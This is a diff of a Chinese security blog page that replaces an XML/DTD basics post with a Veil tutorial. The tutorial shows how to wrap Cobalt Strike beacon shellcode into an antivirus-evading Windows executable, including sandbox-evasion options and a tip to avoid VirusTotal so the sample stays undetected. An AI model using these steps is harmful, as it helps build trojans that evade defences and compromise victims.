@@ -58,19 +58,27 @@
 </script>
 
 
-  <meta name="description" content="XML简介 XML 被设计用来传输和存储数据。 HTML 被设计用来显示数据。">
-<meta name="keywords" content="owasp">
+  <meta name="description" content="Veil3.0可以将任意脚本或一段shellcode转换成Windows可执行文件，从而逃避了常见防病毒产品的检测，来自python3的Veil一直在更新。">
+<meta name="keywords" content="免杀，payload">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XML和XXE基础">
-<meta property="og:url" content="https://alpha302.github.io/2019/09/29/XML和XXE基础/index.html">
+<meta property="og:title" content="veil制作免杀payload">
+<meta property="og:url" content="https://alpha302.github.io/2019/10/05/免杀veil使用/index.html">
 <meta property="og:site_name" content="Alpha的小站">
-<meta property="og:description" content="XML简介 XML 被设计用来传输和存储数据。 HTML 被设计用来显示数据。">
+<meta property="og:description" content="Veil3.0可以将任意脚本或一段shellcode转换成Windows可执行文件，从而逃避了常见防病毒产品的检测，来自python3的Veil一直在更新。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-02T06:24:20.221Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/test2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/veil2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2007-45-55%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2007-52-01%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2008-07-41%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2008-10-20%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/D1%5BX7%7E4%5B%258E%256L%7D%5DEQO%40SLX.png">
+<meta property="og:updated_time" content="2019-10-08T12:29:42.401Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XML和XXE基础">
-<meta name="twitter:description" content="XML简介 XML 被设计用来传输和存储数据。 HTML 被设计用来显示数据。">
-  <link rel="canonical" href="https://alpha302.github.io/2019/09/29/XML和XXE基础/">
+<meta name="twitter:title" content="veil制作免杀payload">
+<meta name="twitter:description" content="Veil3.0可以将任意脚本或一段shellcode转换成Windows可执行文件，从而逃避了常见防病毒产品的检测，来自python3的Veil一直在更新。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/test2.png">
+  <link rel="canonical" href="https://alpha302.github.io/2019/10/05/免杀veil使用/">
 
 
 <script id="page-configurations">
@@ -84,7 +92,7 @@
   };
 </script>
 
-  <title>XML和XXE基础 | Alpha的小站</title>
+  <title>veil制作免杀payload | Alpha的小站</title>
   
 
 
@@ -289,7 +297,7 @@
   
   
   <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="https://alpha302.github.io/2019/09/29/XML和XXE基础/">
+    <link itemprop="mainEntityOfPage" href="https://alpha302.github.io/2019/10/05/免杀veil使用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wang">
@@ -301,7 +309,7 @@
       <meta itemprop="name" content="Alpha的小站">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">XML和XXE基础
+        <h1 class="post-title" itemprop="name headline">veil制作免杀payload
 
           
         </h1>
@@ -317,7 +325,7 @@
                 
               
 
-              <time title="创建时间：2019-09-29 10:54:40" itemprop="dateCreated datePublished" datetime="2019-09-29T10:54:40+08:00">2019-09-29</time>
+              <time title="创建时间：2019-10-05 11:24:03" itemprop="dateCreated datePublished" datetime="2019-10-05T11:24:03+08:00">2019-10-05</time>
             </span>
           
             
@@ -328,7 +336,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-10-02 14:24:20" itemprop="dateModified" datetime="2019-10-02T14:24:20+08:00">2019-10-02</time>
+                <time title="修改时间：2019-10-08 20:29:42" itemprop="dateModified" datetime="2019-10-08T20:29:42+08:00">2019-10-08</time>
               </span>
             
           
@@ -338,7 +346,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/owasp/" itemprop="url" rel="index"><span itemprop="name">owasp</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/内网渗透/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a></span>
 
                 
                 
@@ -363,7 +371,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span>2.7k</span>
+              <span>3.5k</span>
             </span>
           
             <span class="post-meta-item" title="阅读时长">
@@ -373,7 +381,7 @@
               
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
               
-              <span>2 分钟</span>
+              <span>3 分钟</span>
             </span>
           
 
@@ -386,78 +394,50 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h3><ul>
-<li>XML 被设计用来传输和存储数据。</li>
-<li>HTML 被设计用来显示数据。<a id="more"></a>
+        <blockquote>
+<p>Veil3.0可以将任意脚本或一段shellcode转换成Windows可执行文件，从而逃避了常见防病毒产品的检测，来自python3的Veil一直在更新。</p>
+</blockquote>
+<a id="more"></a>
+
+<hr>
+<h3 id="kali安装"><a href="#kali安装" class="headerlink" title="kali安装"></a>kali安装</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># apt -y install veil</span></span><br><span class="line">root@kali<span class="symbol">:~</span><span class="comment"># /usr/share/veil/config/setup.sh --force --silent</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><ul>
+<li>在Kali上运行Veil，生成payload</li>
+<li>如果使用的是Pyinstaller，payload会转成能够直接使用的可执行程序</li>
+<li>如果使用的是Py2Exe，把payload.py和两个相关的文件放到windows系统上。执行批处理脚本将payload转换成可执行程序。</li>
+</ul>
+<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="启动veil"><a href="#启动veil" class="headerlink" title="启动veil"></a>启动veil</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/test2.png" alt="avatar"></p>
+<p>有两个免杀的工具，Evasion和Ordnance。</p>
+<ul>
+<li>Ordnance可生成在Veil-Evasion中使用的shellcode</li>
+<li>Evasion是用做文件免杀<br>我们选择Evasion<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Veil&gt;: use <span class="number">1</span>                   <span class="comment">#选择Evasion功能</span></span><br><span class="line">Veil/Evasion&gt;: list            <span class="comment">#查看payload列表</span></span><br></pre></td></tr></table></figure>
+
 </li>
 </ul>
-<hr>
-<h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><h4 id="所有XML都必须要有关闭标签。"><a href="#所有XML都必须要有关闭标签。" class="headerlink" title="所有XML都必须要有关闭标签。"></a>所有XML都必须要有关闭标签。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;note&gt; this&apos;s note example &lt;/note&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/veil2.png" alt="avatar"><br>查看payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">[*] Available Payloads:</span><br><span class="line"></span><br><span class="line">	1)	autoit/shellcode_inject/flat.py</span><br><span class="line"></span><br><span class="line">	2)	auxiliary/coldwar_wrapper.py</span><br><span class="line">	3)	auxiliary/macro_converter.py</span><br><span class="line">	4)	auxiliary/pyinstaller_wrapper.py</span><br><span class="line"></span><br><span class="line">	5)	c/meterpreter/rev_http.py</span><br><span class="line">	6)	c/meterpreter/rev_http_service.py</span><br><span class="line">	7)	c/meterpreter/rev_tcp.py</span><br><span class="line">	8)	c/meterpreter/rev_tcp_service.py</span><br><span class="line"></span><br><span class="line">	9)	cs/meterpreter/rev_http.py</span><br><span class="line">	10)	cs/meterpreter/rev_https.py</span><br><span class="line">	11)	cs/meterpreter/rev_tcp.py</span><br><span class="line">	12)	cs/shellcode_inject/base64.py</span><br><span class="line">	13)	cs/shellcode_inject/virtual.py</span><br><span class="line"></span><br><span class="line">	14)	go/meterpreter/rev_http.py</span><br><span class="line">	15)	go/meterpreter/rev_https.py</span><br><span class="line">	16)	go/meterpreter/rev_tcp.py</span><br><span class="line">	17)	go/shellcode_inject/virtual.py</span><br><span class="line"></span><br><span class="line">	18)	lua/shellcode_inject/flat.py</span><br><span class="line"></span><br><span class="line">	19)	perl/shellcode_inject/flat.py</span><br><span class="line"></span><br><span class="line">	20)	powershell/meterpreter/rev_http.py</span><br><span class="line">	21)	powershell/meterpreter/rev_https.py</span><br><span class="line">	22)	powershell/meterpreter/rev_tcp.py</span><br><span class="line">	23)	powershell/shellcode_inject/psexec_virtual.py</span><br><span class="line">	24)	powershell/shellcode_inject/virtual.py</span><br><span class="line"></span><br><span class="line">	25)	python/meterpreter/bind_tcp.py</span><br><span class="line">	26)	python/meterpreter/rev_http.py</span><br><span class="line">	27)	python/meterpreter/rev_https.py</span><br><span class="line">	28)	python/meterpreter/rev_tcp.py</span><br><span class="line">	29)	python/shellcode_inject/aes_encrypt.py</span><br><span class="line">	30)	python/shellcode_inject/arc_encrypt.py</span><br><span class="line">	31)	python/shellcode_inject/base64_substitution.py</span><br><span class="line">	32)	python/shellcode_inject/des_encrypt.py</span><br><span class="line">	33)	python/shellcode_inject/flat.py</span><br><span class="line">	34)	python/shellcode_inject/letter_substitution.py</span><br><span class="line">	35)	python/shellcode_inject/pidinject.py</span><br><span class="line">	36)	python/shellcode_inject/stallion.py</span><br><span class="line"></span><br><span class="line">	37)	ruby/meterpreter/rev_http.py</span><br><span class="line">	38)	ruby/meterpreter/rev_https.py</span><br><span class="line">	39)	ruby/meterpreter/rev_tcp.py</span><br><span class="line">	40)	ruby/shellcode_inject/base64.py</span><br><span class="line">	41)	ruby/shellcode_inject/flat.py</span><br></pre></td></tr></table></figure>
 
-<h4 id="所有XML的标签对大小写敏感"><a href="#所有XML的标签对大小写敏感" class="headerlink" title="所有XML的标签对大小写敏感"></a>所有XML的标签对大小写敏感</h4><p>XML 标签对大小写敏感。在 XML 中，标签 <letter> 与标签 <letter> 是不同的。<br>必须使用相同的大小写来编写打开标签和关闭标签</letter></letter></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Message&gt;这是错误的。&lt;/message&gt;</span><br><span class="line"></span><br><span class="line">&lt;message&gt;这是正确的。&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+<p>推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。</p>
+<h4 id="选择go语言stager"><a href="#选择go语言stager" class="headerlink" title="选择go语言stager"></a>选择go语言stager</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Veil/Evasion&gt;: use <span class="number">17</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="XML的属性值必须加引号"><a href="#XML的属性值必须加引号" class="headerlink" title="XML的属性值必须加引号"></a>XML的属性值必须加引号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- wrong example --&gt;</span><br><span class="line"></span><br><span class="line">&lt;note data=8/2/16/&gt; &lt;/note&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- right example --&gt;</span><br><span class="line"></span><br><span class="line">&lt;note data=&quot;08/02/16&quot;&gt; &lt;/note&gt;</span><br></pre></td></tr></table></figure>
+<p>生成一个包含并执行CSpayload的go语言代码，和该代码编译成的可执行文件</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Required Options:</span><br><span class="line">Name            	Value   	Description</span><br><span class="line">----            	-----   	-----------</span><br><span class="line">BADMACS         	FALSE   	<span class="comment">#查看运行环境的MAC地址(反调试)</span></span><br><span class="line">CLICKTRACK      	X       	<span class="comment">#点击次数才会执行</span></span><br><span class="line">COMPILE_TO_EXE  	Y       	<span class="comment">#编译成exe文件</span></span><br><span class="line">CURSORCHECK     	FALSE   	<span class="comment">#设置硬盘容量(反沙盒)</span></span><br><span class="line">DISKSIZE        	X       	<span class="comment"># 设置只有磁盘大小满足时执行                           </span></span><br><span class="line">HOSTNAME        	X       	<span class="comment">#只有计算机名为hostname的值时才执行</span></span><br><span class="line">INJECT_METHOD   	Virtual 	<span class="comment">#Virtual or Heap</span></span><br><span class="line">MINPROCS        	X       	<span class="comment">#设置只有环境进程数满足时执行</span></span><br><span class="line">PROCCHECK       	FALSE   	<span class="comment">#只有运行环境的进程中没有虚拟机进程时才会执行payload（指定目标环境 反沙箱的方式）</span></span><br><span class="line">PROCESSORS      	X       	<span class="comment">#指定核心数的机器中才会执行payload（指定目标环境 反沙箱的方式）</span></span><br><span class="line">RAMCHECK        	FALSE   	<span class="comment">#只在运行环境的内存为3G以上时才会执行payload（指定目标环境 反沙箱的方式）</span></span><br><span class="line">SLEEP           	X       	<span class="comment">#休眠10秒 以检测是否运行过程中被加速（反沙箱)</span></span><br><span class="line">USERNAME        	X       	<span class="comment">#只有在当前用户名正确的机器中才执行payload</span></span><br><span class="line">USERPROMPT      	FALSE   	<span class="comment">#受害者计算机只有加入Comp域中时，才会执行payload（指定目标环境 反沙箱的方式）</span></span><br><span class="line">UTCCHECK        	Y   	 <span class="comment">#只在运行环境的系统使用UTC时间时，才会执行payload</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="在-XML-中，-5个实体引用来代替符号："><a href="#在-XML-中，-5个实体引用来代替符号：" class="headerlink" title="在 XML 中， 5个实体引用来代替符号："></a>在 XML 中， 5个实体引用来代替符号：</h4><table>
-<thead>
-<tr>
-<th>实体引用</th>
-<th>符号</th>
-<th>中文解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&amp;it</td>
-<td>＜</td>
-<td>小于号</td>
-</tr>
-<tr>
-<td>&amp;gt</td>
-<td>＞</td>
-<td>大于号</td>
-</tr>
-<tr>
-<td>&amp;amp</td>
-<td>&amp;</td>
-<td>和号</td>
-</tr>
-<tr>
-<td>&amp;apos</td>
-<td>‘</td>
-<td>单引号</td>
-</tr>
-<tr>
-<td>&amp;quot</td>
-<td>“</td>
-<td>双引号</td>
-</tr>
-</tbody></table>
-<hr>
-<h3 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h3><pre><code>- XML文档结构包括DTD文档类型定义和文档元素信息。</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;     #第一行是 XML 声明   </span><br><span class="line">&lt;note&gt;                                          #第二行根元素&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;                                 #3-6描述根的4个子元素（to,from,heading以及body）</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;                   </span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;      </span><br><span class="line">&lt;/note&gt;                                         #最后闭合根元素&lt;note&gt;结束</span><br></pre></td></tr></table></figure>
+<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[go/shellcode_inject/virtual<span class="meta">&gt;&gt;</span>]: generate</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2007-45-55%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
+<p>此时需要我们选择shellcode，我用cs生成</p>
 <ul>
-<li><p>XML DTD</p>
-<p>  DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
-</li>
+<li>Attacks -&gt; Packages -&gt; Payload Generator</li>
+<li>Windows/beacon_http/reverse/http</li>
 </ul>
-<p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2007-52-01%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
+<p>复制cs的payload到veil中<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2008-07-41%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&gt;] Please enter the base name for output files (default is payload): test</span><br><span class="line">生成木马</span><br></pre></td></tr></table></figure>
 
-<p>DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br><span class="line">这是包含 DTD 的 &quot;note.dtd&quot; 文件：</span><br><span class="line">&lt;!-- note.dtd </span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="DTD中的实体"><a href="#DTD中的实体" class="headerlink" title="DTD中的实体"></a>DTD中的实体</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
-<ul>
-<li>实体引用是对实体的引用。</li>
-<li>实体可在内部或外部进行声明。</li>
-</ul>
-<h4 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line"></span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML example:</span><br><span class="line"></span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
-
-<hr>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2008-10-20%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="avatar"><br>test.exe即为注入内存的免杀木马。</p>
+<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/D1%5BX7%7E4%5B%258E%256L%7D%5DEQO%40SLX.png" alt="avatar"><br>卑微，只能过360，腾讯哈勃没过得去。正常用没问题<br>大家尽量不要用virustotal去做测试，这个会总合杀毒软件并将样本提交给杀毒软件。也就是说只能用一次。</p>
 
     </div>
 
@@ -478,12 +458,12 @@
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
 
-  <p><span>本文标题:</span>XML和XXE基础</a></p>
+  <p><span>本文标题:</span>veil制作免杀payload</a></p>
   <p><span>文章作者:</span>wang</a></p>
-  <p><span>发布时间:</span>2019年09月29日 - 10:54:40</p>
-  <p><span>最后更新:</span>2019年10月02日 - 14:24:20</p>
-  <p><span>原始链接:</span><a href="/2019/09/29/XML和XXE基础/" title="XML和XXE基础">https://alpha302.github.io/2019/09/29/XML和XXE基础/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://alpha302.github.io/2019/09/29/XML和XXE基础/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年10月05日 - 11:24:03</p>
+  <p><span>最后更新:</span>2019年10月08日 - 20:29:42</p>
+  <p><span>原始链接:</span><a href="/2019/10/05/免杀veil使用/" title="veil制作免杀payload">https://alpha302.github.io/2019/10/05/免杀veil使用/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://alpha302.github.io/2019/10/05/免杀veil使用/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -523,7 +503,7 @@
           
           <div class="post-tags">
             
-              <a href="/tags/owasp/" rel="tag"># owasp</a>
+              <a href="/tags/免杀，payload/" rel="tag"># 免杀，payload</a>
             
           </div>
         
@@ -533,8 +513,8 @@
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/09/27/hexo优化/" rel="next" title="主题美化">
-                  <i class="fa fa-chevron-left"></i> 主题美化
+                <a href="/2019/10/05/内网渗透1/" rel="next" title="内网渗透1">
+                  <i class="fa fa-chevron-left"></i> 内网渗透1
                 </a>
               
             </div>
@@ -543,8 +523,8 @@
 
             <div class="post-nav-prev post-nav-item">
               
-                <a href="/2019/10/05/内网渗透1/" rel="prev" title="内网渗透1">
-                  内网渗透1 <i class="fa fa-chevron-right"></i>
+                <a href="/2019/10/07/CobaltStrike安装/" rel="prev" title="CobaltStrike安装">
+                  CobaltStrike安装 <i class="fa fa-chevron-right"></i>
                 </a>
               
             </div>
@@ -597,7 +577,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XML简介"><span class="nav-number">1.</span> <span class="nav-text">XML简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML语法"><span class="nav-number">2.</span> <span class="nav-text">XML语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#所有XML都必须要有关闭标签。"><span class="nav-number">2.1.</span> <span class="nav-text">所有XML都必须要有关闭标签。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#所有XML的标签对大小写敏感"><span class="nav-number">2.2.</span> <span class="nav-text">所有XML的标签对大小写敏感</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XML的属性值必须加引号"><span class="nav-number">2.3.</span> <span class="nav-text">XML的属性值必须加引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在-XML-中，-5个实体引用来代替符号："><span class="nav-number">2.4.</span> <span class="nav-text">在 XML 中， 5个实体引用来代替符号：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML结构"><span class="nav-number">3.</span> <span class="nav-text">XML结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD中的实体"><span class="nav-number">4.</span> <span class="nav-text">DTD中的实体</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#内部实体声明"><span class="nav-number">4.1.</span> <span class="nav-text">内部实体声明</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#外部实体声明"><span class="nav-number">5.</span> <span class="nav-text">外部实体声明</span></a></li></ol></div>
